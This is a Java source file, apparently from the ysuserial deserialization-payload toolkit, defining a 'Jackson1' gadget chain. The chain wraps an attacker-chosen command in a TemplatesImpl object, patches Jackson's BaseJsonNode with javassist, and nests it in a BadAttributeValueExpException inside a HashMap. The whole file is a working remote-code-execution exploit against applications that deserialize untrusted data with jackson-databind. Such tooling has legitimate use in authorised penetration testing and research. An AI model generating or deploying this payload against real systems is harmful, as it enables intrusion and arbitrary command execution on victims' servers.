package org.su18.ysuserial.payloads.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Gadgets;
import org.su18.ysuserial.payloads.util.PayloadRunner;
import org.su18.ysuserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"com.fasterxml.jackson.core:jackson-databind:2.14.2"})
@Authors({Authors.Y4ER})
public class Jackson1 implements ObjectPayload<Object> {

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Jackson1.class, args);
    }

    public Object getObject(final String command) throws Exception {
        final Object template = Gadgets.createTemplatesImpl(command);

        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        // 将修改后的CtClass加载至当前线程的上下文类加载器中
        ctClass.toClass();

        POJONode node = new POJONode(template);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException, "val", node);

        HashMap hashMap = new HashMap();
        hashMap.put(template, badAttributeValueExpException);

        return hashMap;
    }
}
